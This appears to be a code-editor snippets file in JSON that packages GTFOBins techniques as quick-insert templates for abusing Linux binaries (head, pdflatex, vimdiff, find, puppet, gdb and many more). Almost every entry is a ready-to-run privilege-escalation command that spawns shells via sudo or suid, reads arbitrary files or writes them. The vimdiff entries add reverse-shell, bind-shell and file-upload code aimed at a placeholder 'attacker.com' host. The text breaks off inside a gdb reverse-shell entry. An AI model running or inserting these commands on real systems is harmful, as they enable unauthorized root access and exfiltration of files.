{
    "head file-read (gtfobins)": {
        "prefix": "head file-read",
        "body": [
            "abuse head with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "head -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse head with file-read"
    },
    "head suid (gtfobins)": {
        "prefix": "head suid",
        "body": [
            "abuse head with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./head -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse head with suid"
    },
    "head sudo (gtfobins)": {
        "prefix": "head sudo",
        "body": [
            "abuse head with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo head -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse head with sudo"
    },
    "journalctl shell (gtfobins)": {
        "prefix": "journalctl shell",
        "body": [
            "abuse journalctl with shell",
            "",
            "```sh",
            "journalctl",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse journalctl with shell"
    },
    "journalctl sudo (gtfobins)": {
        "prefix": "journalctl sudo",
        "body": [
            "abuse journalctl with sudo",
            "",
            "```sh",
            "sudo journalctl",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse journalctl with sudo"
    },
    "systemctl suid (gtfobins)": {
        "prefix": "systemctl suid",
        "body": [
            "abuse systemctl with suid",
            "",
            "```sh",
            "TF=\\$(mktemp).service",
            "echo '[Service]",
            "Type=oneshot",
            "ExecStart=/bin/sh -c \"id > /tmp/output\"",
            "[Install]",
            "WantedBy=multi-user.target' > \\$TF",
            "./systemctl link \\$TF",
            "./systemctl enable --now \\$TF${0}",
            "```"
        ],
        "description": "abuse systemctl with suid"
    },
    "systemctl sudo (gtfobins)": {
        "prefix": "systemctl sudo",
        "body": [
            "abuse systemctl with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo systemctl",
            "!sh${0}",
            "```"
        ],
        "description": "abuse systemctl with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "pdflatex shell (gtfobins)": {
        "prefix": "pdflatex shell",
        "body": [
            "abuse pdflatex with shell",
            "",
            "```sh",
            "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse pdflatex with shell"
    },
    "pdflatex file-read (gtfobins)": {
        "prefix": "pdflatex file-read",
        "body": [
            "abuse pdflatex with file-read, The read file will be part of the output.",
            "",
            "```sh",
            "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{${1:file_to_read}}\\end{document}'",
            "pdftotext article.pdf -${0}",
            "```"
        ],
        "description": "abuse pdflatex with file-read - The read file will be part of the output."
    },
    "pdflatex sudo (gtfobins)": {
        "prefix": "pdflatex sudo",
        "body": [
            "abuse pdflatex with sudo",
            "",
            "```sh",
            "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse pdflatex with sudo"
    },
    "pdflatex limited-suid (gtfobins)": {
        "prefix": "pdflatex limited-suid",
        "body": [
            "abuse pdflatex with limited-suid",
            "",
            "```sh",
            "./pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse pdflatex with limited-suid"
    },
    "arp file-read (gtfobins)": {
        "prefix": "arp file-read",
        "body": [
            "abuse arp with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "arp -v -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse arp with file-read"
    },
    "arp suid (gtfobins)": {
        "prefix": "arp suid",
        "body": [
            "abuse arp with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./arp -v -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse arp with suid"
    },
    "arp sudo (gtfobins)": {
        "prefix": "arp sudo",
        "body": [
            "abuse arp with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo arp -v -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse arp with sudo"
    },
    "vigr suid (gtfobins)": {
        "prefix": "vigr suid",
        "body": [
            "abuse vigr with suid",
            "",
            "```sh",
            "./vigr${0}",
            "```"
        ],
        "description": "abuse vigr with suid"
    },
    "vigr sudo (gtfobins)": {
        "prefix": "vigr sudo",
        "body": [
            "abuse vigr with sudo",
            "",
            "```sh",
            "sudo vigr${0}",
            "```"
        ],
        "description": "abuse vigr with sudo"
    },
    "cmp file-read (gtfobins)": {
        "prefix": "cmp file-read",
        "body": [
            "abuse cmp with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "cmp \\$LFILE /dev/zero -b -l${0}",
            "```"
        ],
        "description": "abuse cmp with file-read"
    },
    "cmp suid (gtfobins)": {
        "prefix": "cmp suid",
        "body": [
            "abuse cmp with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./cmp \\$LFILE /dev/zero -b -l${0}",
            "```"
        ],
        "description": "abuse cmp with suid"
    },
    "cmp sudo (gtfobins)": {
        "prefix": "cmp sudo",
        "body": [
            "abuse cmp with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo cmp \\$LFILE /dev/zero -b -l${0}",
            "```"
        ],
        "description": "abuse cmp with sudo"
    },
    "slsh shell (gtfobins)": {
        "prefix": "slsh shell",
        "body": [
            "abuse slsh with shell",
            "",
            "```sh",
            "slsh -e 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse slsh with shell"
    },
    "slsh sudo (gtfobins)": {
        "prefix": "slsh sudo",
        "body": [
            "abuse slsh with sudo",
            "",
            "```sh",
            "sudo slsh -e 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse slsh with sudo"
    },
    "slsh limited-suid (gtfobins)": {
        "prefix": "slsh limited-suid",
        "body": [
            "abuse slsh with limited-suid",
            "",
            "```sh",
            "./slsh -e 'system(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse slsh with limited-suid"
    },
    "ash shell (gtfobins)": {
        "prefix": "ash shell",
        "body": [
            "abuse ash with shell",
            "",
            "```sh",
            "ash${0}",
            "```"
        ],
        "description": "abuse ash with shell"
    },
    "ash file-write (gtfobins)": {
        "prefix": "ash file-write",
        "body": [
            "abuse ash with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "ash -c 'echo DATA > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse ash with file-write"
    },
    "ash suid (gtfobins)": {
        "prefix": "ash suid",
        "body": [
            "abuse ash with suid",
            "",
            "```sh",
            "./ash${0}",
            "```"
        ],
        "description": "abuse ash with suid"
    },
    "ash sudo (gtfobins)": {
        "prefix": "ash sudo",
        "body": [
            "abuse ash with sudo",
            "",
            "```sh",
            "sudo ash${0}",
            "```"
        ],
        "description": "abuse ash with sudo"
    },
    "cupsfilter file-read (gtfobins)": {
        "prefix": "cupsfilter file-read",
        "body": [
            "abuse cupsfilter with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "cupsfilter -i application/octet-stream -m application/octet-stream \\$LFILE${0}",
            "```"
        ],
        "description": "abuse cupsfilter with file-read"
    },
    "cupsfilter sudo (gtfobins)": {
        "prefix": "cupsfilter sudo",
        "body": [
            "abuse cupsfilter with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo cupsfilter -i application/octet-stream -m application/octet-stream \\$LFILE${0}",
            "```"
        ],
        "description": "abuse cupsfilter with sudo"
    },
    "cupsfilter suid (gtfobins)": {
        "prefix": "cupsfilter suid",
        "body": [
            "abuse cupsfilter with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./cupsfilter -i application/octet-stream -m application/octet-stream \\$LFILE${0}",
            "```"
        ],
        "description": "abuse cupsfilter with suid"
    },
    "apt shell (gtfobins)": {
        "prefix": "apt shell",
        "body": [
            "abuse apt with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "apt changelog apt",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse apt with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "apt sudo (gtfobins)": {
        "prefix": "apt sudo",
        "body": [
            "abuse apt with sudo, When the shell exits the `update` command is actually executed.",
            "",
            "```sh",
            "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh${0}",
            "```"
        ],
        "description": "abuse apt with sudo - When the shell exits the `update` command is actually executed."
    },
    "sshpass shell (gtfobins)": {
        "prefix": "sshpass shell",
        "body": [
            "abuse sshpass with shell",
            "",
            "```sh",
            "sshpass /bin/sh${0}",
            "```"
        ],
        "description": "abuse sshpass with shell"
    },
    "sshpass suid (gtfobins)": {
        "prefix": "sshpass suid",
        "body": [
            "abuse sshpass with suid",
            "",
            "```sh",
            "./sshpass /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse sshpass with suid"
    },
    "sshpass sudo (gtfobins)": {
        "prefix": "sshpass sudo",
        "body": [
            "abuse sshpass with sudo",
            "",
            "```sh",
            "sudo sshpass /bin/sh${0}",
            "```"
        ],
        "description": "abuse sshpass with sudo"
    },
    "aa-exec shell (gtfobins)": {
        "prefix": "aa-exec shell",
        "body": [
            "abuse aa-exec with shell",
            "",
            "```sh",
            "aa-exec /bin/sh${0}",
            "```"
        ],
        "description": "abuse aa-exec with shell"
    },
    "aa-exec suid (gtfobins)": {
        "prefix": "aa-exec suid",
        "body": [
            "abuse aa-exec with suid",
            "",
            "```sh",
            "./aa-exec /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse aa-exec with suid"
    },
    "aa-exec sudo (gtfobins)": {
        "prefix": "aa-exec sudo",
        "body": [
            "abuse aa-exec with sudo",
            "",
            "```sh",
            "sudo aa-exec /bin/sh${0}",
            "```"
        ],
        "description": "abuse aa-exec with sudo"
    },
    "nm file-read (gtfobins)": {
        "prefix": "nm file-read",
        "body": [
            "abuse nm with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nm @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse nm with file-read"
    },
    "nm suid (gtfobins)": {
        "prefix": "nm suid",
        "body": [
            "abuse nm with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./nm @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse nm with suid"
    },
    "nm sudo (gtfobins)": {
        "prefix": "nm sudo",
        "body": [
            "abuse nm with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo nm @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse nm with sudo"
    },
    "cpulimit shell (gtfobins)": {
        "prefix": "cpulimit shell",
        "body": [
            "abuse cpulimit with shell",
            "",
            "```sh",
            "cpulimit -l 100 -f /bin/sh${0}",
            "```"
        ],
        "description": "abuse cpulimit with shell"
    },
    "cpulimit suid (gtfobins)": {
        "prefix": "cpulimit suid",
        "body": [
            "abuse cpulimit with suid",
            "",
            "```sh",
            "./cpulimit -l 100 -f -- /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse cpulimit with suid"
    },
    "cpulimit sudo (gtfobins)": {
        "prefix": "cpulimit sudo",
        "body": [
            "abuse cpulimit with sudo",
            "",
            "```sh",
            "sudo cpulimit -l 100 -f /bin/sh${0}",
            "```"
        ],
        "description": "abuse cpulimit with sudo"
    },
    "ip file-read (gtfobins)": {
        "prefix": "ip file-read",
        "body": [
            "abuse ip with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ip -force -batch \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ip with file-read"
    },
    "ip suid (gtfobins)": {
        "prefix": "ip suid",
        "body": [
            "abuse ip with suid, This only works for Linux with CONFIG_NET_NS=y.",
            "",
            "```sh",
            "./ip netns add foo",
            "./ip netns exec foo /bin/sh -p",
            "./ip netns delete foo${0}",
            "```"
        ],
        "description": "abuse ip with suid - This only works for Linux with CONFIG_NET_NS=y."
    },
    "ip sudo (gtfobins)": {
        "prefix": "ip sudo",
        "body": [
            "abuse ip with sudo, This only works for Linux with CONFIG_NET_NS=y. This version also grants network access.",
            "",
            "```sh",
            "sudo ip netns add foo",
            "sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar",
            "sudo ip netns exec bar /bin/sh",
            "sudo ip netns delete foo",
            "sudo ip netns delete bar${0}",
            "```"
        ],
        "description": "abuse ip with sudo - This only works for Linux with CONFIG_NET_NS=y. This version also grants network access."
    },
    "ginsh shell (gtfobins)": {
        "prefix": "ginsh shell",
        "body": [
            "abuse ginsh with shell",
            "",
            "```sh",
            "ginsh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ginsh with shell"
    },
    "ginsh limited-suid (gtfobins)": {
        "prefix": "ginsh limited-suid",
        "body": [
            "abuse ginsh with limited-suid",
            "",
            "```sh",
            "./ginsh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ginsh with limited-suid"
    },
    "ginsh sudo (gtfobins)": {
        "prefix": "ginsh sudo",
        "body": [
            "abuse ginsh with sudo",
            "",
            "```sh",
            "sudo ginsh",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ginsh with sudo"
    },
    "ascii-xfr file-read (gtfobins)": {
        "prefix": "ascii-xfr file-read",
        "body": [
            "abuse ascii-xfr with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ascii-xfr -ns \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ascii-xfr with file-read"
    },
    "ascii-xfr suid (gtfobins)": {
        "prefix": "ascii-xfr suid",
        "body": [
            "abuse ascii-xfr with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ascii-xfr -ns \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ascii-xfr with suid"
    },
    "ascii-xfr sudo (gtfobins)": {
        "prefix": "ascii-xfr sudo",
        "body": [
            "abuse ascii-xfr with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ascii-xfr -ns \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse ascii-xfr with sudo"
    },
    "dvips shell (gtfobins)": {
        "prefix": "dvips shell",
        "body": [
            "abuse dvips with shell",
            "",
            "```sh",
            "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'",
            "dvips -R0 texput.dvi${0}",
            "```"
        ],
        "description": "abuse dvips with shell"
    },
    "dvips sudo (gtfobins)": {
        "prefix": "dvips sudo",
        "body": [
            "abuse dvips with sudo",
            "",
            "```sh",
            "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'",
            "sudo dvips -R0 texput.dvi${0}",
            "```"
        ],
        "description": "abuse dvips with sudo"
    },
    "dvips limited-suid (gtfobins)": {
        "prefix": "dvips limited-suid",
        "body": [
            "abuse dvips with limited-suid",
            "",
            "```sh",
            "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'",
            "./dvips -R0 texput.dvi${0}",
            "```"
        ],
        "description": "abuse dvips with limited-suid"
    },
    "vimdiff shell (gtfobins)": {
        "prefix": "vimdiff shell",
        "body": [
            "abuse vimdiff with shell, This requires that `vimdiff` is compiled with Lua support.",
            "",
            "```sh",
            "vimdiff -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with shell - This requires that `vimdiff` is compiled with Lua support."
    },
    "vimdiff reverse-shell (gtfobins)": {
        "prefix": "vimdiff reverse-shell",
        "body": [
            "abuse vimdiff with reverse-shell, This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")",
            "vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with reverse-shell - This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "vimdiff non-interactive-reverse-shell (gtfobins)": {
        "prefix": "vimdiff non-interactive-reverse-shell",
        "body": [
            "abuse vimdiff with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "vimdiff -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse vimdiff with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vimdiff non-interactive-bind-shell (gtfobins)": {
        "prefix": "vimdiff non-interactive-bind-shell",
        "body": [
            "abuse vimdiff with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "vimdiff -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse vimdiff with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vimdiff file-upload (gtfobins)": {
        "prefix": "vimdiff file-upload",
        "body": [
            "abuse vimdiff with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "vimdiff -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse vimdiff with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vimdiff file-download (gtfobins)": {
        "prefix": "vimdiff file-download",
        "body": [
            "abuse vimdiff with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "vimdiff -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse vimdiff with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed."
    },
    "vimdiff file-write (gtfobins)": {
        "prefix": "vimdiff file-write",
        "body": [
            "abuse vimdiff with file-write",
            "",
            "```sh",
            "vimdiff ${1:file_to_write}",
            "iDATA",
            "^[",
            "w${0}",
            "```"
        ],
        "description": "abuse vimdiff with file-write"
    },
    "vimdiff file-read (gtfobins)": {
        "prefix": "vimdiff file-read",
        "body": [
            "abuse vimdiff with file-read",
            "",
            "```sh",
            "vimdiff ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse vimdiff with file-read"
    },
    "vimdiff library-load (gtfobins)": {
        "prefix": "vimdiff library-load",
        "body": [
            "abuse vimdiff with library-load, This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with library-load - This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vimdiff suid (gtfobins)": {
        "prefix": "vimdiff suid",
        "body": [
            "abuse vimdiff with suid, This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with suid - This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vimdiff sudo (gtfobins)": {
        "prefix": "vimdiff sudo",
        "body": [
            "abuse vimdiff with sudo, This requires that `vimdiff` is compiled with Lua support.",
            "",
            "```sh",
            "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with sudo - This requires that `vimdiff` is compiled with Lua support."
    },
    "vimdiff capabilities (gtfobins)": {
        "prefix": "vimdiff capabilities",
        "body": [
            "abuse vimdiff with capabilities, This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with capabilities - This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "vimdiff limited-suid (gtfobins)": {
        "prefix": "vimdiff limited-suid",
        "body": [
            "abuse vimdiff with limited-suid, This requires that `vimdiff` is compiled with Lua support.",
            "",
            "```sh",
            "./vimdiff -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse vimdiff with limited-suid - This requires that `vimdiff` is compiled with Lua support."
    },
    "flock shell (gtfobins)": {
        "prefix": "flock shell",
        "body": [
            "abuse flock with shell",
            "",
            "```sh",
            "flock -u / /bin/sh${0}",
            "```"
        ],
        "description": "abuse flock with shell"
    },
    "flock suid (gtfobins)": {
        "prefix": "flock suid",
        "body": [
            "abuse flock with suid",
            "",
            "```sh",
            "./flock -u / /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse flock with suid"
    },
    "flock sudo (gtfobins)": {
        "prefix": "flock sudo",
        "body": [
            "abuse flock with sudo",
            "",
            "```sh",
            "sudo flock -u / /bin/sh${0}",
            "```"
        ],
        "description": "abuse flock with sudo"
    },
    "gcc file-read (gtfobins)": {
        "prefix": "gcc file-read",
        "body": [
            "abuse gcc with file-read, The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "gcc @\"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse gcc with file-read - The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data."
    },
    "gcc file-write (gtfobins)": {
        "prefix": "gcc file-write",
        "body": [
            "abuse gcc with file-write",
            "",
            "```sh",
            "LFILE=file_to_delete",
            "gcc -xc /dev/null -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse gcc with file-write"
    },
    "gcc shell (gtfobins)": {
        "prefix": "gcc shell",
        "body": [
            "abuse gcc with shell",
            "",
            "```sh",
            "gcc -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse gcc with shell"
    },
    "gcc sudo (gtfobins)": {
        "prefix": "gcc sudo",
        "body": [
            "abuse gcc with sudo",
            "",
            "```sh",
            "sudo gcc -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse gcc with sudo"
    },
    "exiftool file-read (gtfobins)": {
        "prefix": "exiftool file-read",
        "body": [
            "abuse exiftool with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "OUTPUT=output_file",
            "exiftool -filename=\\$OUTPUT \\$LFILE",
            "cat \\$OUTPUT${0}",
            "```"
        ],
        "description": "abuse exiftool with file-read"
    },
    "exiftool file-write (gtfobins)": {
        "prefix": "exiftool file-write",
        "body": [
            "abuse exiftool with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "INPUT=input_file",
            "exiftool -filename=\\$LFILE \\$INPUT${0}",
            "```"
        ],
        "description": "abuse exiftool with file-write"
    },
    "exiftool sudo (gtfobins)": {
        "prefix": "exiftool sudo",
        "body": [
            "abuse exiftool with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "INPUT=input_file",
            "sudo exiftool -filename=\\$LFILE \\$INPUT${0}",
            "```"
        ],
        "description": "abuse exiftool with sudo"
    },
    "puppet shell (gtfobins)": {
        "prefix": "puppet shell",
        "body": [
            "abuse puppet with shell",
            "",
            "```sh",
            "puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <\\$(tty) >\\$(tty) 2>\\$(tty)\\\"': }\"${0}",
            "```"
        ],
        "description": "abuse puppet with shell"
    },
    "puppet file-write (gtfobins)": {
        "prefix": "puppet file-write",
        "body": [
            "abuse puppet with file-write, The file path must be absolute.",
            "",
            "```sh",
            "LFILE=\"/tmp/${1:file_to_write}\"",
            "puppet apply -e \"file { '\\$LFILE': content => 'DATA' }\"${0}",
            "```"
        ],
        "description": "abuse puppet with file-write - The file path must be absolute."
    },
    "puppet file-read (gtfobins)": {
        "prefix": "puppet file-read",
        "body": [
            "abuse puppet with file-read, The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "puppet filebucket -l diff /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse puppet with file-read - The read file content is corrupted by the `diff` output format. The actual `/usr/bin/diff` command is executed."
    },
    "puppet sudo (gtfobins)": {
        "prefix": "puppet sudo",
        "body": [
            "abuse puppet with sudo",
            "",
            "```sh",
            "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <\\$(tty) >\\$(tty) 2>\\$(tty)\\\"': }\"${0}",
            "```"
        ],
        "description": "abuse puppet with sudo"
    },
    "psql shell (gtfobins)": {
        "prefix": "psql shell",
        "body": [
            "abuse psql with shell",
            "",
            "```sh",
            "psql",
            "\\?",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse psql with shell"
    },
    "psql sudo (gtfobins)": {
        "prefix": "psql sudo",
        "body": [
            "abuse psql with sudo",
            "",
            "```sh",
            "psql",
            "\\?",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse psql with sudo"
    },
    "joe shell (gtfobins)": {
        "prefix": "joe shell",
        "body": [
            "abuse joe with shell",
            "",
            "```sh",
            "joe",
            "^K!/bin/sh${0}",
            "```"
        ],
        "description": "abuse joe with shell"
    },
    "joe limited-suid (gtfobins)": {
        "prefix": "joe limited-suid",
        "body": [
            "abuse joe with limited-suid",
            "",
            "```sh",
            "./joe",
            "^K!/bin/sh${0}",
            "```"
        ],
        "description": "abuse joe with limited-suid"
    },
    "joe sudo (gtfobins)": {
        "prefix": "joe sudo",
        "body": [
            "abuse joe with sudo",
            "",
            "```sh",
            "sudo joe",
            "^K!/bin/sh${0}",
            "```"
        ],
        "description": "abuse joe with sudo"
    },
    "find shell (gtfobins)": {
        "prefix": "find shell",
        "body": [
            "abuse find with shell",
            "",
            "```sh",
            "find . -exec /bin/sh \\; -quit${0}",
            "```"
        ],
        "description": "abuse find with shell"
    },
    "find suid (gtfobins)": {
        "prefix": "find suid",
        "body": [
            "abuse find with suid",
            "",
            "```sh",
            "./find . -exec /bin/sh -p \\; -quit${0}",
            "```"
        ],
        "description": "abuse find with suid"
    },
    "find sudo (gtfobins)": {
        "prefix": "find sudo",
        "body": [
            "abuse find with sudo",
            "",
            "```sh",
            "sudo find . -exec /bin/sh \\; -quit${0}",
            "```"
        ],
        "description": "abuse find with sudo"
    },
    "find file-write (gtfobins)": {
        "prefix": "find file-write",
        "body": [
            "abuse find with file-write, DATA is a format string, it supports some escape sequences.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "find / -fprintf \"\\$FILE\" DATA -quit${0}",
            "```"
        ],
        "description": "abuse find with file-write - DATA is a format string, it supports some escape sequences."
    },
    "gdb shell (gtfobins)": {
        "prefix": "gdb shell",
        "body": [
            "abuse gdb with shell",
            "",
            "```sh",
            "gdb -nx -ex '!sh' -ex quit${0}",
            "```"
        ],
        "description": "abuse gdb with shell"
    },
    "gdb reverse-shell (gtfobins)": {
        "prefix": "gdb reverse-shell",
        "body": [
            "abuse gdb with reverse-shell, This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
